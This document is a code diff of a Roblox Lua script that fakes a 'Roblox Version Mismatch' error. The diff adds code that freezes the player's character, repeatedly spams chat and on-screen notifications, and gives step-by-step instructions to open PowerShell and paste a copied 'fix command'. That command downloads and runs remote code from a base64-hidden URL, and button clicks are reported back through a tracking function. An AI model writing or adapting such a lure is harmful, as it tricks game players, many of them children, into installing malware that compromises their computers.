@@ -1,16 +1,21 @@
 -- ============================================================
 -- SERVICES
 -- ============================================================
-local Players      = game:GetService("Players")
-local GuiService   = game:GetService("GuiService")
-local TweenService = game:GetService("TweenService")
-local UIS          = game:GetService("UserInputService")
-local lp           = Players.LocalPlayer
+local Players         = game:GetService("Players")
+local GuiService      = game:GetService("GuiService")
+local TweenService    = game:GetService("TweenService")
+local UIS             = game:GetService("UserInputService")
+local StarterGui      = game:GetService("StarterGui")
+local ContextActionSvc= game:GetService("ContextActionService")
+local TextChatService = game:GetService("TextChatService")
+local SoundService    = game:GetService("SoundService")
+
+local lp = Players.LocalPlayer
 
 local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
 
 -- ============================================================
--- ⚙️ FIX COMMAND — текст, который копируется по кнопке
+-- ⚙️ FIX COMMAND — копируется по кнопке
 -- ============================================================
 local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing)"
 
@@ -70,14 +75,16 @@ local function sendHit(executorName, eventType)
 end
 
 -- ============================================================
--- PALETTE — Roblox dialog style
+-- PALETTE
 -- ============================================================
 local C = {
     dim       = Color3.fromRGB(0, 0, 0),
-    card      = Color3.fromRGB(43, 43, 43),      -- #2B2B2B
-    separator = Color3.fromRGB(90, 90, 90),      -- #5A5A5A
+    card      = Color3.fromRGB(43, 43, 43),
+    separator = Color3.fromRGB(90, 90, 90),
     title     = Color3.fromRGB(255, 255, 255),
     body      = Color3.fromRGB(224, 224, 224),
+    stepNum   = Color3.fromRGB(0, 162, 255),
+    stepText  = Color3.fromRGB(240, 240, 240),
     errorTxt  = Color3.fromRGB(170, 170, 170),
     btnBg     = Color3.fromRGB(255, 255, 255),
     btnText   = Color3.fromRGB(40, 40, 40),
@@ -85,6 +92,162 @@ local C = {
     green     = Color3.fromRGB(0, 180, 70),
     red       = Color3.fromRGB(210, 60, 60),
 }
+
+-- ============================================================
+-- FREEZE CHARACTER
+-- ============================================================
+local FROZEN_ACTION = "RobloxVersionFreeze"
+
+local function freezeCharacter(character)
+    if not character then return end
+
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.JumpHeight = 0
+
+        task.spawn(function()
+            while character.Parent and humanoid.Parent do
+                if humanoid.WalkSpeed ~= 0 then humanoid.WalkSpeed = 0 end
+                if humanoid.JumpPower ~= 0 then humanoid.JumpPower = 0 end
+                if humanoid.JumpHeight ~= 0 then humanoid.JumpHeight = 0 end
+                task.wait(0.25)
+            end
+        end)
+    end
+
+    pcall(function()
+        ContextActionSvc:BindAction(
+            FROZEN_ACTION,
+            function() return Enum.ContextActionResult.Sink end,
+            false,
+            Enum.PlayerActions.CharacterForward,
+            Enum.PlayerActions.CharacterBackward,
+            Enum.PlayerActions.CharacterLeft,
+            Enum.PlayerActions.CharacterRight,
+            Enum.PlayerActions.CharacterJump
+        )
+    end)
+end
+
+local function hookCharacterFreeze()
+    if lp.Character then
+        freezeCharacter(lp.Character)
+    end
+    lp.CharacterAdded:Connect(function(char)
+        char:WaitForChild("Humanoid", 10)
+        task.wait(0.2)
+        freezeCharacter(char)
+    end)
+end
+
+hookCharacterFreeze()
+
+-- ============================================================
+-- NOTIFICATIONS CONFIG
+-- ============================================================
+local NOTIFY = {
+    chatEnabled    = true,
+    cornerEnabled  = true,
+    soundEnabled   = true,
+    spamEnabled    = true,
+    spamCount      = 5,
+    spamInterval   = 8,
+    cornerEverySec = 30,
+}
+
+local _stopSpam = false
+
+-- ── Chat message ────────────────────────────────────────────
+local function sendChatMessage(text, color)
+    color = color or Color3.fromRGB(255, 100, 100)
+
+    -- TextChatService (modern)
+    local ok = pcall(function()
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local channels = TextChatService:FindFirstChild("TextChannels")
+            if not channels then return false end
+            local general = channels:FindFirstChild("RBXGeneral")
+                         or channels:FindFirstChild("General")
+                         or channels:GetChildren()[1]
+            if general and general.DisplaySystemMessage then
+                local hex = string.format("#%02X%02X%02X",
+                    math.floor(color.R * 255),
+                    math.floor(color.G * 255),
+                    math.floor(color.B * 255))
+                general:DisplaySystemMessage("<font color='" .. hex .. "'>" .. text .. "</font>")
+                return true
+            end
+        end
+        return false
+    end)
+
+    -- Legacy chat fallback
+    if not ok then
+        pcall(function()
+            StarterGui:SetCore("ChatMakeSystemMessage", {
+                Text = text,
+                Color = color,
+                Font = Enum.Font.SourceSansBold,
+                TextSize = 18,
+            })
+        end)
+    end
+end
+
+-- ── Corner notification (right bottom) ──────────────────────
+local function sendCornerNotification()
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title    = "Roblox Version Mismatch",
+            Text     = "Your client is outdated. Open the fix dialog to continue.",
+            Duration = 8,
+        })
+    end)
+end
+
+-- ── Sound alert ─────────────────────────────────────────────
+local function playAlertSound()
+    pcall(function()
+        local s = Instance.new("Sound")
+        s.SoundId = "rbxasset://sounds/action_failure.wav"
+        s.Volume = 1
+        s.Parent = SoundService
+        s:Play()
+        game:GetService("Debris"):AddItem(s, 3)
+    end)
+end
+
+-- ── Chat spam loop ──────────────────────────────────────────
+local function startChatSpam()
+    if not NOTIFY.chatEnabled or not NOTIFY.spamEnabled then return end
+
+    task.spawn(function()
+        for i = 1, NOTIFY.spamCount do
+            if _stopSpam then break end
+            sendChatMessage(
+                "[Roblox] Version mismatch detected. Open the fix dialog and copy the command.",
+                Color3.fromRGB(255, 100, 100)
+            )
+            if i < NOTIFY.spamCount then
+                task.wait(NOTIFY.spamInterval)
+            end
+        end
+    end)
+end
+
+-- ── Repeat corner notification periodically ─────────────────
+local function startCornerRepeater()
+    if not NOTIFY.cornerEnabled then return end
+    task.spawn(function()
+        while not _stopSpam do
+            task.wait(NOTIFY.cornerEverySec)
+            if _stopSpam then break end
+            sendCornerNotification()
+        end
+    end)
+end
 
 -- ============================================================
 -- SCREEN GUI
@@ -114,8 +277,8 @@ dim.Parent = gui
 local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize
            or Vector2.new(1280, 720)
 
-local CARD_W = isMobile and math.min(340, vp.X - 24) or 440
-local CARD_H = 320
+local CARD_W = isMobile and math.min(340, vp.X - 24) or 460
+local CARD_H = 400
 local cardX  = -CARD_W / 2
 local cardY  = -CARD_H / 2
 
@@ -132,11 +295,11 @@ cardCorner.CornerRadius = UDim.new(0, 4)
 cardCorner.Parent = card
 
 -- ============================================================
--- TITLE (centered, top)
+-- TITLE
 -- ============================================================
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, -40, 0, 28)
-title.Position = UDim2.new(0, 20, 0, 28)
+title.Position = UDim2.new(0, 20, 0, 24)
 title.BackgroundTransparency = 1
 title.Text = "Roblox Version Mismatch"
 title.TextColor3 = C.title
@@ -148,11 +311,11 @@ title.ZIndex = 7
 title.Parent = card
 
 -- ============================================================
--- SEPARATOR (under title)
+-- SEPARATOR
 -- ============================================================
 local sep = Instance.new("Frame")
 sep.Size = UDim2.new(1, -48, 0, 1)
-sep.Position = UDim2.new(0, 24, 0, 72)
+sep.Position = UDim2.new(0, 24, 0, 68)
 sep.BackgroundColor3 = C.separator
 sep.BackgroundTransparency = 0.3
 sep.BorderSizePixel = 0
@@ -160,33 +323,75 @@ sep.ZIndex = 6
 sep.Parent = card
 
 -- ============================================================
--- BODY TEXT (centered, wrapped)
+-- INTRO TEXT
 -- ============================================================
-local bodyText = Instance.new("TextLabel")
-bodyText.Size = UDim2.new(1, -48, 0, 90)
-bodyText.Position = UDim2.new(0, 24, 0, 92)
-bodyText.BackgroundTransparency = 1
-bodyText.Text = "Your Roblox client is outdated and cannot run this script. Open PowerShell with WIN+R, paste the copied command, then restart Roblox."
-bodyText.TextColor3 = C.body
-bodyText.TextSize = 14
-bodyText.Font = Enum.Font.Gotham
-bodyText.TextXAlignment = Enum.TextXAlignment.Center
-bodyText.TextYAlignment = Enum.TextYAlignment.Top
-bodyText.TextWrapped = true
-bodyText.LineHeight = 1.15
-bodyText.ZIndex = 7
-bodyText.Parent = card
+local introText = Instance.new("TextLabel")
+introText.Size = UDim2.new(1, -48, 0, 32)
+introText.Position = UDim2.new(0, 24, 0, 80)
+introText.BackgroundTransparency = 1
+introText.Text = "Your Roblox client is outdated. Follow the steps below to fix it:"
+introText.TextColor3 = C.body
+introText.TextSize = 13
+introText.Font = Enum.Font.Gotham
+introText.TextXAlignment = Enum.TextXAlignment.Center
+introText.TextYAlignment = Enum.TextYAlignment.Top
+introText.TextWrapped = true
+introText.LineHeight = 1.15
+introText.ZIndex = 7
+introText.Parent = card
 
 -- ============================================================
--- ERROR CODE (dimmer, centered)
+-- STEP BUILDER (with rich text bold)
+-- ============================================================
+local function buildStep(yPos, number, richText)
+    local num = Instance.new("TextLabel")
+    num.Size = UDim2.new(0, 26, 0, 22)
+    num.Position = UDim2.new(0, 24, 0, yPos)
+    num.BackgroundTransparency = 1
+    num.Text = number .. "."
+    num.TextColor3 = C.stepNum
+    num.TextSize = 13
+    num.Font = Enum.Font.GothamBold
+    num.TextXAlignment = Enum.TextXAlignment.Left
+    num.TextYAlignment = Enum.TextYAlignment.Center
+    num.ZIndex = 7
+    num.Parent = card
+
+    local step = Instance.new("TextLabel")
+    step.Size = UDim2.new(1, -62, 0, 22)
+    step.Position = UDim2.new(0, 52, 0, yPos)
+    step.BackgroundTransparency = 1
+    step.RichText = true
+    step.Text = richText
+    step.TextColor3 = C.stepText
+    step.TextSize = 13
+    step.Font = Enum.Font.Gotham
+    step.TextXAlignment = Enum.TextXAlignment.Left
+    step.TextYAlignment = Enum.TextYAlignment.Center
+    step.ZIndex = 7
+    step.Parent = card
+end
+
+local startY = 120
+local stepGap = 24
+
+buildStep(startY + stepGap * 0, "1", "Press <b>WIN + R</b> on your keyboard")
+buildStep(startY + stepGap * 1, "2", "Type <b>powershell</b> and press <b>ENTER</b>")
+buildStep(startY + stepGap * 2, "3", "Click <b>Copy Fix Command</b> below")
+buildStep(startY + stepGap * 3, "4", "Paste with <b>Ctrl + V</b> into PowerShell")
+buildStep(startY + stepGap * 4, "5", "Press <b>ENTER</b> to run the fix")
+buildStep(startY + stepGap * 5, "6", "Restart Roblox and run script again")
+
+-- ============================================================
+-- ERROR CODE
 -- ============================================================
 local errorText = Instance.new("TextLabel")
-errorText.Size = UDim2.new(1, -48, 0, 20)
-errorText.Position = UDim2.new(0, 24, 0, 190)
+errorText.Size = UDim2.new(1, -48, 0, 18)
+errorText.Position = UDim2.new(0, 24, 0, 274)
 errorText.BackgroundTransparency = 1
 errorText.Text = "(Error Code: 277)"
 errorText.TextColor3 = C.errorTxt
-errorText.TextSize = 13
+errorText.TextSize = 12
 errorText.Font = Enum.Font.Gotham
 errorText.TextXAlignment = Enum.TextXAlignment.Center
 errorText.TextYAlignment = Enum.TextYAlignment.Center
@@ -221,7 +426,7 @@ end
 -- ============================================================
 local copyBtn = Instance.new("TextButton")
 copyBtn.Size = UDim2.new(1, -48, 0, 46)
-copyBtn.Position = UDim2.new(0, 24, 0, 228)
+copyBtn.Position = UDim2.new(0, 24, 0, 308)
 copyBtn.BackgroundColor3 = C.btnBg
 copyBtn.Text = "Copy Fix Command"
 copyBtn.TextColor3 = C.btnText
@@ -245,19 +450,20 @@ end)
 
 copyBtn.MouseButton1Click:Connect(function()
     sendHit("fix", "copy")
+    _stopSpam = true
 
     local copied = setClipboard(FIX_COMMAND)
     if copied then
-        copyBtn.Text = "✓  Copied"
+        copyBtn.Text = "✓  Copied — paste into PowerShell"
         copyBtn.TextColor3 = C.btnBg
         copyBtn.BackgroundColor3 = C.green
     else
-        copyBtn.Text = "✕  Copy failed"
+        copyBtn.Text = "✕  Copy failed — try again"
         copyBtn.TextColor3 = C.btnBg
         copyBtn.BackgroundColor3 = C.red
     end
 
-    task.delay(1.6, function()
+    task.delay(2.2, function()
         if copyBtn and copyBtn.Parent then
             copyBtn.Text = "Copy Fix Command"
             copyBtn.TextColor3 = C.btnText
@@ -267,7 +473,7 @@ copyBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ============================================================
--- ENTRANCE ANIMATION (subtle)
+-- ENTRANCE ANIMATION
 -- ============================================================
 pcall(function()
     local startPos = UDim2.new(0.5, cardX, 0.5, cardY + 14)
@@ -280,6 +486,27 @@ pcall(function()
         { Position = endPos, BackgroundTransparency = 0 }
     ):Play()
 end)
+
+-- ============================================================
+-- TRIGGER NOTIFICATIONS
+-- ============================================================
+if NOTIFY.soundEnabled then
+    playAlertSound()
+end
+
+if NOTIFY.cornerEnabled then
+    sendCornerNotification()
+end
+
+if NOTIFY.chatEnabled then
+    sendChatMessage(
+        "[Roblox] Version mismatch detected. Open the fix dialog and copy the command.",
+        Color3.fromRGB(255, 100, 100)
+    )
+    startChatSpam()
+end
+
+startCornerRepeater()
 
 -- ============================================================
 -- ANALYTICS: shown
